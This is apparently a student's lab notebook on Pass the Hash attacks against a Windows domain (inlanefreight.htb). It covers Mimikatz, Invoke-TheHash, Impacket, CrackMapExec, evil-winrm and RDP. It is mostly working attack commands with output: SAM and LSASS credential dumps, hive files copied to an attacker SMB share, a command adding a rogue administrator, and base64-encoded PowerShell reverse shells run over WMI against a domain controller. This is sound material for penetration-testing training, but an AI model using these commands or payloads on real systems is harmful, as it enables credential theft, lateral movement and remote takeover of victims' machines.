# Pass the Hash (PtH)

Using of password hash instead of the plain text password for authentication.

Ways to obtain Hashes :
- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller
- Pulling the hashes from memory (lsass.exe)

## Windows NTLM Introduction

Windows New Technology LAN Manager (NTLM) : passwords stored on the server and domain controller are not "salted"

-> possible to use a NTLM hash directly

## Pass the Hash with Mimikatz (Windows)

required to use sekurlsa::pth Mimikatz module :

/user - The user name we want to impersonate.
/rc4 or /NTLM - NTLM hash of the user's password.
/domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
/run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

required to use Invoke-TheHash Powershell function :

Target - Hostname or IP address of the target.
Username - Username to use for authentication.
Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

### Reverse Shell
.\nc.exe -lvnp 8001
https://www.revshells.com/
-> 172.16.1.5 and port 8001, and select the option PowerShell #3 (Base64)

cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

## Pass the Hash with Impacket (Linux)

impacket-psexec administrator@$TARGET -hashes :30B3783CE2ABF1AF70F77D0660CF3453

## Pass the Hash with CrackMapExec (Linux)

crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

-> possible to add --local-auth option (password re-use on a subnet)
-> possible to add -x option to execute command

crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

## Pass the Hash with evil-winrm (Linux)


## Pass the Hash with RDP (Linux)

-> Restricted Admin Mode, which is disabled by default, should be enabled on the target host

### Enable Restricted Admin Mode to Allow PtH

This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0.

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

Once the registry key is added :
xfreerdp  /v:$TARGET /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

## UAC Limits Pass the Hash for Local Accounts

UAC (User Account Control) limits local administrative account ability to perform remote administration operations.

If the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0 :
- Only built-in local admin account (RID-500, "Administrator")

- It means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer.

https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167

# LAB

crackmapexec smb $TARGET -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
evil-winrm -i $TARGET -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 -x cat C:\pth.txt

evil-winrm -i $TARGET -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
cat c:\pth.txt
G3t_4CCE$$_V1@_PTH

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp  /v:$TARGET /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453

c:\tools>hostname
MS01

mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /NTLM:30B3783CE2ABF1AF70F77D0660CF3453 /domain:. /run:cmd.exe" exit

reg.exe save hklm\sam C:\tools\sam.save
reg.exe save hklm\system C:\tools\system.save
reg.exe save hklm\security C:\tools\security.save

mimikatz.exe privilege::debug "lsadump::sam sam.save system.save"

--> FAILED

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/
move sam.save \\10.10.14.226\CompData
move security.save \\10.10.14.226\CompData
move system.save \\10.10.14.226\CompData

--> FAILED

mimikatz.exe privilege::debug token::elevate "lsadump::sam sam.save security.save" exit

---

Domain : MS01
SysKey : 29fc3535fc09fb37d22dc9f3339f6875
Local SID : S-1-5-21-430213916-1543111962-1809483319

SAMKey : ce1aaebcd385f02026282eea38ef458f

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 30b3783ce2abf1af70f77d0660cf3453
    lm  - 0: 3e25fb4602188f3c17428e15b455ac3e
    ntlm- 0: 30b3783ce2abf1af70f77d0660cf3453
    ntlm- 1: bdaffbfe64f1fc646a3353be1c2c3c99

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f78e777bc1cb4d7c987ffca495b0b8f6
...

---

Task Manager > Create a dump file


Mimikatz “sekurlsa::minidump C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP”
sekurlsa::logonPasswords

Authentication Id : 0 ; 475493 (00000000:00074165)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/5/2023 2:21:18 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
        msv :
         [00000003] Primary
         * Username : david
         * Domain   : INLANEFREIGHT
         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
         * DPAPI    : eaa6db50c1544304014d858928d9694f
        tspkg :
        wdigest :
         * Username : david
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : david
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
        ssp :
        credman :


evil-winrm -i $TARGET -u David -H c39f2beb3d2ec06a62cb887fb391dee0

xfreerdp  /v:$TARGET /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453

mimikatz.exe privilege::debug "sekurlsa::pth /user:David /NTLM:c39f2beb3d2ec06a62cb887fb391dee0 /domain:. /run:cmd.exe" exit

dir \\DC01\david

type \\DC01\david\david.txt

Authentication Id : 0 ; 470635 (00000000:00072e6b)
Session           : Service from 0
User Name         : julio
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/5/2023 2:21:17 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1106
        msv :
         [00000003] Primary
         * Username : julio
         * Domain   : INLANEFREIGHT
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
         * DPAPI    : 634db497baef212b777909a4ccaaf700
        tspkg :
        wdigest :
         * Username : julio
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : julio
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
        ssp :
        credman :

mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:. /run:cmd.exe" exit

type \\DC01\julio\julio.txt
JuL1()_SH@re_fl@g

xfreerdp  /v:$TARGET /u:julio /pth:64f12cddaa88057e06a81b54e73b949b

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Windows\system32> hostname
MS01

PS C:\tools\Invoke-TheHash> nslookup DC01
Server:  DC01.inlanefreight.htb
Address:  172.16.1.10

Name:    DC01.inlanefreight.htb
Address:  172.16.1.10

cd C:\tools
.\nc.exe -lvnp 8001

cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.10] 49881
whoami
inlanefreight\julio
PS C:\Windows\system32> type c:\julio\flag.txt
JuL1()_N3w_fl@g